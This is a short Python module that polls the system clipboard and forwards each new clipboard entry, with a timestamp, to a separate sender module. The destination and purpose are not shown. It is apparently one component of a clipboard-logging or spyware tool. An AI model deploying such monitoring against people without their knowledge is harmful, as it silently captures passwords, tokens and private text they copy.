import time
import config
from pyperclip import paste
from sender import send_data
from utils import get_timestamp, log


def start_clipboard_monitoring():
    previous = ""
    log("Clipboard monitoring started", module="clipboard")
    try:
        while True:
            current = paste()
            if current and current != previous:
                previous = current
                log(f"Clipboard content changed", "DEBUG", "clipboard")
                send_data({
                    "timestamp": get_timestamp(),
                    "content": current
                }, "clipboard")
            time.sleep(config.CLIPBOARD_CHECK_INTERVAL)
    except KeyboardInterrupt:
        log("Clipboard monitoring stopped", module="clipboard")
    except Exception as e:
        log(f"Clipboard monitoring error: {e}", "ERROR", "clipboard")
